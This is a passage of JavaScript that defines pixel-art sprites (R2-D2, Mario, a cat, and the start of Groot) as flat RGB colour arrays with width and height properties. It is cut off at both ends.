255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 47, 47, 47, 47, 47, 47, 0, 0, 255, 255, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 113, 113, 113, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 113, 113, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 113, 113, 113, 0, 0, 0, 113, 113, 113, 113, 113, 113, 255, 255, 255, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 113, 255, 255, 255, 113, 113, 113, 113, 113, 113, 0, 0, 0, 113, 113, 113, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 113, 113, 113, 0, 0, 0, 255, 255, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 113, 113, 113, 255, 255, 255, 0, 0, 0, 113, 113, 113, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 113, 113, 113, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 113, 113, 113, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 113, 113, 113, 113, 113, 113, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 255, 255, 255, 113, 113, 113, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 113, 113, 113, 255, 255, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 113, 113, 113, 113, 113, 113, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 113, 113, 113, 113, 113, 113, 0, 0, 0, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 113, 113, 113, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 113, 113, 113, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
r2d2.width = 19;
r2d2.height = 23;
var mario2 = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 173, 33, 34, 173, 33, 34, 173, 33, 34, 173, 33, 34, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 173, 33, 34, 255, 0, 0, 255, 0, 0, 255, 0, 0, 247, 255, 91, 255, 0, 0, 173, 33, 34, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 255, 0, 0, 255, 0, 0, 204, 30, 22, 204, 30, 22, 247, 255, 91, 247, 255, 91, 255, 255, 255, 173, 33, 34, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 204, 30, 22, 255, 0, 0, 204, 30, 22, 204, 30, 22, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 173, 33, 34, 204, 30, 22, 204, 30, 22, 204, 30, 22, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 173, 33, 34, 255, 188, 131, 0, 0, 0, 0, 0, 0, 0, 0, 0, 252, 139, 99, 0, 0, 0, 252, 139, 99, 0, 0, 0, 252, 139, 99, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 255, 188, 131, 117, 76, 41, 255, 188, 131, 0, 0, 0, 252, 139, 99, 255, 188, 131, 0, 0, 0, 255, 188, 131, 0, 0, 0, 255, 188, 131, 117, 76, 41, 117, 76, 41, 255, 255, 255, 173, 33, 34, 252, 139, 99, 117, 76, 41, 255, 188, 131, 0, 0, 0, 0, 0, 0, 255, 188, 131, 255, 188, 131, 255, 188, 131, 255, 188, 131, 255, 188, 131, 255, 188, 131, 255, 188, 131, 117, 76, 41, 173, 33, 34, 0, 0, 0, 252, 139, 99, 255, 188, 131, 0, 0, 0, 255, 188, 131, 255, 188, 131, 0, 0, 0, 252, 139, 99, 252, 139, 99, 252, 139, 99, 252, 139, 99, 252, 139, 99, 117, 76, 41, 255, 255, 255, 0, 0, 0, 0, 0, 0, 252, 139, 99, 252, 139, 99, 255, 188, 131, 255, 188, 131, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 117, 76, 41, 117, 76, 41, 252, 139, 99, 252, 139, 99, 252, 139, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 255, 54, 41, 117, 76, 41, 117, 76, 41, 117, 76, 41, 117, 76, 41, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 255, 54, 41, 255, 54, 41, 255, 0, 0, 65, 170, 255, 65, 170, 255, 153, 239, 255, 153, 239, 255, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 173, 33, 34, 117, 76, 41, 117, 76, 41, 117, 76, 41, 65, 170, 255, 255, 255, 255, 255, 255, 255, 153, 239, 255, 255, 255, 255, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 117, 76, 41, 255, 255, 255, 255, 255, 255, 255, 255, 255, 117, 76, 41, 255, 255, 255, 255, 255, 255, 153, 239, 255, 255, 255, 255, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 117, 76, 41, 255, 255, 255, 255, 255, 255, 117, 76, 41, 65, 170, 255, 65, 170, 255, 65, 170, 255, 153, 239, 255, 153, 239, 255, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 117, 76, 41, 255, 255, 255, 255, 255, 255, 117, 76, 41, 65, 170, 255, 65, 170, 255, 58, 81, 255, 65, 170, 255, 58, 81, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 117, 76, 41, 117, 76, 41, 117, 76, 41, 117, 76, 41, 0, 0, 0, 117, 76, 41, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 117, 76, 41, 117, 76, 41, 117, 76, 41, 247, 255, 91, 0, 0, 0, 247, 255, 91, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255];
mario2.width = 14;
mario2.height = 20;
var cat = [255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 252, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 252, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 0, 0, 0, 255, 255, 252, 255, 255, 252, 255, 255, 252, 255, 255, 252, 0, 0, 0, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 109, 109, 109, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 109, 109, 109, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 177, 177, 177, 109, 109, 109, 109, 109, 109, 177, 177, 177, 109, 109, 109, 177, 177, 177, 177, 177, 177, 109, 109, 109, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 177, 177, 177, 0, 0, 0, 255, 255, 252, 0, 0, 0, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 177, 177, 177, 0, 0, 0, 0, 0, 0, 109, 109, 109, 177, 177, 177, 0, 0, 0, 177, 177, 177, 177, 177, 177, 0, 0, 0, 177, 177, 177, 177, 177, 177, 0, 0, 0, 177, 177, 177, 177, 177, 177, 109, 109, 109, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 252, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 0, 0, 0, 0, 0, 0, 255, 174, 234, 255, 174, 234, 177, 177, 177, 177, 177, 177, 0, 0, 0, 177, 177, 177, 0, 0, 0, 177, 177, 177, 177, 177, 177, 255, 174, 234, 255, 174, 234, 177, 177, 177, 109, 109, 109, 177, 177, 177, 109, 109, 109, 177, 177, 177, 0, 0, 0, 244, 250, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 0, 0, 0, 0, 0, 0, 255, 174, 234, 255, 174, 234, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 255, 174, 234, 255, 174, 234, 177, 177, 177, 109, 109, 109, 177, 177, 177, 109, 109, 109, 177, 177, 177, 177, 177, 177, 0, 0, 0, 0, 0, 0, 0, 0, 0, 109, 109, 109, 0, 0, 0, 0, 0, 0, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 177, 177, 177, 0, 0, 0, 255, 255, 255, 0, 0, 0, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 177, 177, 177, 0, 0, 0, 255, 255, 255, 0, 0, 0, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 109, 109, 109, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 177, 109, 109, 109, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 109, 109, 109, 177, 177, 177, 109, 109, 109, 109, 109, 109, 177, 177, 177, 109, 109, 109, 177, 177, 177, 177, 177, 177, 177, 177, 177, 109, 109, 109, 177, 177, 177, 109, 109, 109, 109, 109, 109, 177, 177, 177, 109, 109, 109, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 177, 177, 177, 0, 0, 0, 0, 0, 0, 177, 177, 177, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 177, 177, 177, 0, 0, 0, 0, 0, 0, 177, 177, 177, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
cat.width = 23;
cat.height = 18;
var groot = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 51, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 14, 51, 0, 0, 0, 0, 0, 0, 0, 14, 51, 0, 0, 0, 0, 14, 51, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 145, 83, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 145, 83, 15, 0, 0, 0, 14, 51, 0, 0, 0, 0, 180, 83, 15, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 145, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 145, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 145, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 145, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 145, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 145, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 145, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 0, 0, 0, 0, 0, 0, 180, 83, 15, 0, 0, 0, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 180, 83, 15, 145, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 145, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 180, 83, 15, 180, 83, 15, 180, 83, 15, 180, 83, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 